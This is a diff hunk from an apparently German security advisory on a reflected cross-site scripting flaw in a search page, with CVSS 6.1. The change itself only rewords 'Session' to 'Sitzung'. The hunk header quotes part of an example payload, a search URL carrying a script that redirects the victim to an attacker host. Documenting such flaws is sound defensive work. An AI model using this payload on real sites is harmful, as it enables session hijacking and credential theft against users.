@@ -604,7 +604,7 @@ https://example.com/search?SearchText=<script>document.location='https://attacke
 ```
 
 und den Link einem Opfer zukommen lassen. Klickt das Opfer den Link, während es angemeldet ist, läuft das Skript in
-seiner Browser-Session und ermöglicht das Übernehmen der Session, den Diebstahl von Zugangsdaten oder erzwungene
+seiner Browser-Sitzung und ermöglicht das Übernehmen der Sitzung, den Diebstahl von Zugangsdaten oder erzwungene
 Aktionen im Namen des Opfers.
 
 Der CVSS-Wert ist wegen der nötigen Mitwirkung des Benutzers zwar Mittel (6,1), aber die Verbreitung von Suchseiten im
